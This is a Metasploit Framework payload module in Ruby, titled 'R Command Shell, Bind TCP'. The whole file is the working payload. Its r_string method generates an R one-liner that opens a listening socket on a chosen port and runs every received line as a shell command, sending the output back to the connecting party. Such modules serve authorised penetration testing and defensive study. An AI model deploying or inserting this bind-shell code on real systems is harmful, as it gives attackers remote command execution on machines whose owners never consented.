##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/r'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 125

  include Msf::Payload::Single
  include Msf::Payload::R
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'R Command Shell, Bind TCP',
      'Description' => 'Continually listen for a connection and spawn a command shell via R',
      'Author'      => [ 'RageLtMan <rageltman[at]sempervictus>' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'r',
      'Arch'        => ARCH_R,
      'Handler'     => Msf::Handler::BindTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'r',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    return prepends(r_string)
  end

  def r_string
    return "s<-socketConnection(port=#{datastore['LPORT']}," +
    "blocking=TRUE,server=TRUE,open='r+');while(TRUE){writeLines(readLines" +
    "(pipe(readLines(s,1))),s)}"
  end
end
